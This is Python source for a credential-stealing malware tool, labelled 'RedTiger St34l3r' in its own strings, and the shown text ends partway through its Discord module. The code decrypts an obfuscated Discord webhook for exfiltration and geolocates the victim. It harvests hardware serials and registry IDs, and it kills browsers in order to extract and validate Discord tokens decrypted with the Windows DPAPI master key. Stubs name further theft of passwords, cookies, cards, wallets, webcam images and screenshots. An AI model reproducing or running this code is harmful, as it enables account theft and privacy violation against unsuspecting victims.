
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_F4k33rr0r(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
OwsP2Etsmod0fxo7ErnX6V7aDC6/tH7HT7pHESDbYBraBMVMJ6mARFRmJIcux3Jv/y2dqHFd6daLhUM+aAkRMtjoUP4lOPeIbMwhhQ7wfFJH7LJx30penEhBsM8DmWYWVR+bNqdvFmKeVMdn29dzitkgEIzax9+CWLDciQqeq7EcbXc84eBJ61thT//RQ1gphXaS58B4MVu3St+5aFEI6w==
"""

v4r_k3y            = "MvnRrXjkdjTzVJqBVKaRoChkHhgALAPGBTyVsQrbUhwOzBkSZqUgonMmkudpKCStWXmqcdpdTGTdgISSvFprPNxyljSzIDsjTBHevzRyPhpVNGQlnZsQuSHdxVjeDVKdomHHXmvxUhCwAgcHYNZREDiKdQNKoR"
v4r_website        = "None"
v4r_color_embed    = 0xa80505
v4r_username_embed = "RedTiger St34l3r"
v4r_avatar_embed   = "https://google.com"
v4r_footer_text    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

def D3f_Sy5t3mInf0(v4r_zip_file):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: v4r_sy5t3m_1nf0 = platform.system()
    except: v4r_sy5t3m_1nf0 = "None"

    try: v4r_sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: v4r_sy5t3m_v3r5i0n_1nf0 = "None"

    try: v4r_m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: v4r_m4c_4ddr355 = "None"

    try: v4r_r4m_1nf0 = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: v4r_r4m_1nf0 = "None"

    try: v4r_cpu_1nf0 = platform.processor()
    except: v4r_cpu_1nf0 = "None"

    try: v4r_cpu_c0r3_1nf0 = str(psutil.cpu_count(logical=False)) + " Core"
    except: v4r_cpu_c0r3_1nf0 = "None"

    try: v4r_gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: v4r_gpu_1nf0 = "None"

    v4r_path_Cryptography                 = r"SOFTWARE\Microsoft\Cryptography"
    v4r_path_SQMClient                    = r"SOFTWARE\Microsoft\SQMClient"
    v4r_path_HardwareProfiles             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    v4r_path_Nvidia                       = r'SOFTWARE\NVIDIA Corporation'
    v4r_path_HardwareConfig               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Cryptography, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            v4r_Machine_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            v4r_Guid_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Guid_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            v4r_Hw_Profile_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Hw_Profile_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_SQMClient, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            v4r_Machine_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Nvidia+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            v4r_Nvidia_System_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Nvidia_System_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            v4r_Motherboard_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            v4r_Motherboard_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            v4r_Bios_Release_Date = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Release_Date = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            v4r_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            v4r_System_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            v4r_System_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            v4r_System_Family_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Family_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            v4r_System_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            v4r_System_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            v4r_System_SKU_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_SKU_Serial_Number = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: v4r_Uuid_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: v4r_Uuid_Serial_Number = None

    try: v4r_Bios_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: v4r_Bios_Serial_Number = None

    try: v4r_Motherboard_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: v4r_Motherboard_Serial_Number = None

    try: v4r_Processor_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: v4r_Processor_Serial_Number = None

    try: v4r_OemString_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: v4r_OemString_Serial_Number = None

    try: v4r_Asset_Tag = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: v4r_Asset_Tag = None
        
    try:
        v4r_drives_info = []
        v4r_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if v4r_bitmask & 1:
                v4r_drive_path = v4r_letter + ":\\"
                try:
                    v4r_free_bytes = ctypes.c_ulonglong(0)
                    v4r_total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(v4r_drive_path), None, ctypes.pointer(v4r_total_bytes), ctypes.pointer(v4r_free_bytes))
                    v4r_total_space = v4r_total_bytes.value
                    v4r_free_space = v4r_free_bytes.value
                    v4r_used_space = v4r_total_space - v4r_free_space
                    v4r_drive_name = win32api.GetVolumeInformation(v4r_drive_path)[0]
                    drive = {
                        'drive': v4r_drive_path,
                        'total': v4r_total_space,
                        'free': v4r_free_space,
                        'used': v4r_used_space,
                        'name': v4r_drive_name,
                    }
                    v4r_drives_info.append(drive)
                except:
                    ()
            v4r_bitmask >>= 1

        v4r_d15k_5t4t5 = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in v4r_drives_info:
            v4r_use_percent = (v4r_drive['used'] / v4r_drive['total']) * 100
            v4r_free_space_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            v4r_total_space_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            v4r_use_percent_str = "{:.2f}%".format(v4r_use_percent)
            v4r_d15k_5t4t5 += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   v4r_free_space_gb,
                                                                   v4r_total_space_gb,
                                                                   v4r_use_percent_str,
                                                                   v4r_drive['name'])
    except:
        v4r_d15k_5t4t5 = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            v4r_p14tf0rm_1nf0 = 'Pc Portable'
        else:
            v4r_p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        v4r_p14tf0rm_1nf0 = "None"

    try: v4r_scr33n_number = len(screeninfo.get_monitors())
    except: v4r_scr33n_number = "None"

    v4r_status_system_info = "Yes"
    v4r_file_system_info = f"""
User Pc:
 - Hostname    : {v4r_hostname_pc}
 - Username    : {v4r_username_pc}
 - DisplayName : {v4r_displayname_pc}

System:
 - Plateform     : {v4r_p14tf0rm_1nf0}
 - Exploitation  : {v4r_sy5t3m_1nf0} {v4r_sy5t3m_v3r5i0n_1nf0}
 - Screen Number : {v4r_scr33n_number}

Peripheral:
 - CPU : {v4r_cpu_1nf0}, {v4r_cpu_c0r3_1nf0} 
 - GPU : {v4r_gpu_1nf0}
 - RAM : {v4r_r4m_1nf0}

Disk:
{v4r_d15k_5t4t5}

Serial Number:
 - MAC                       : {v4r_m4c_4ddr355}
 - Machine Id                : {v4r_Machine_Id}
 - Machine Guid              : {v4r_Machine_Guid}
 - Hw Profile Guid           : {v4r_Hw_Profile_Guid}
 - Nvidia System Id          : {v4r_Nvidia_System_Id}
 - Guid Serial Number        : {v4r_Guid_Serial_Number}
 - Uuid Serial Number        : {v4r_Uuid_Serial_Number}
 - Motherboard Serial Number : {v4r_Motherboard_Serial_Number}
 - Motherboard Product       : {v4r_Motherboard_Product_Serial_Number}
 - Motherboard Manufacturer  : {v4r_Motherboard_Manufacturer_Serial_Number}
 - Processor Serial Number   : {v4r_Processor_Serial_Number}
 - Bios Serial Number        : {v4r_Bios_Serial_Number}
 - Bios Release Date         : {v4r_Bios_Release_Date}
 - Bios Version              : {v4r_Bios_Version}
 - System Bios Version       : {v4r_System_Bios_Version}
 - System Version            : {v4r_System_Version}
 - System Family             : {v4r_System_Family_Serial_Number}
 - System Manufacturer       : {v4r_System_Manufacturer_Serial_Number}
 - System Product            : {v4r_System_Product_Serial_Number}
 - System SKU                : {v4r_System_SKU_Serial_Number}
 - Oem String Serial Number  : {v4r_OemString_Serial_Number}
 - Asset Tag Serial Number   : {v4r_Asset_Tag}

Ip:
 - Public : {v4r_ip_address_public}
 - Local  : {v4r_ip_adress_local}

Ip Information:
 - Isp : {v4r_isp}
 - Org : {v4r_org}
 - As  : {v4r_as_number}

Ip Location:
 - Country   : {v4r_country} ({v4r_country_code})
 - Region    : {v4r_region} ({v4r_region_code})
 - Zip       : {v4r_zip_postal}
 - City      : {v4r_city}
 - Timezone  : {v4r_timezone}
 - Longitude : {v4r_longitude}
 - Latitude  : {v4r_latitude}
"""
    v4r_zip_file.writestr("System Info.txt", v4r_file_system_info)

    return v4r_status_system_info

def D3f_Di5c0rdAccount(v4r_zip_file):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    v4r_file_discord_account = ""
    v4r_number_discord_account = 0

    def D3f_Extr4ctT0k3n5():  
        v4r_base_url = "https://discord.com/api/v9/users/@me"
        v4r_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        v4r_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        v4r_t0k3n5 = []
        v4r_uids = []
        v4r_token_info = {}

        v4r_paths = [
            ("Discord",                os.path.join(v4r_path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(v4r_path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(v4r_path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(v4r_path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
            if not os.path.exists(v4r_path):

                continue
            v4r__d15c0rd = v4r_name.replace(" ", "").lower()
            if "cord" in v4r_path:
                if not os.path.exists(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(v4r_regexp_enc, v4r_line.strip()):
                                    v4r_t0k3n = D3f_DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), D3f_GetMasterKey(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')))
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
            else:
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)

        if os.path.exists(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
            for v4r_path, _, v4r_files in os.walk(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(v4r_path, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = ('Firefox', os.path.join(v4r_path, v4r__file))
        return v4r_t0k3n5, v4r_token_info

    def D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
        return requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).status_code == 200

    def D3f_DecryptVal(v4r_buff, v4r_master_key):
        v4r_iv = v4r_buff[3:15]
        v4r_payload = v4r_buff[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None
        with open(v4r_path, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    v4r_t0k3n5, v4r_token_info = D3f_Extr4ctT0k3n5()
    
    if not v4r_t0k3n5:
        v4r_file_discord_account = "No discord tokens found."

